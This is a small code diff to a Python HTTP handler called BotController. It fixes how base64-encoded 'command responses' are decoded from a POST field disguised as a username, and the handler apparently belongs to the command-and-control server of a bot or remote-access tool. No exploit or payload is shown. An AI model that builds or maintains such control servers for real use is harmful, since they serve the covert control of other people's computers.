@@ -314,7 +314,7 @@ class BotController(BaseHTTPRequestHandler):
     def do_POST(self):
         # Command responses.
         data = str(self.rfile.read(int(self.headers.get("Content-Length"))), "utf-8")
-        data = json.loads(b64decode(unquote_plus(data.replace("username=", "", 1)).encode()))
+        data = json.loads(b64decode(unquote_plus(data.replace("username=", "", 1)).encode()).decode())
 
         response = b64decode(data["response"])
         module_name = data["module_name"]
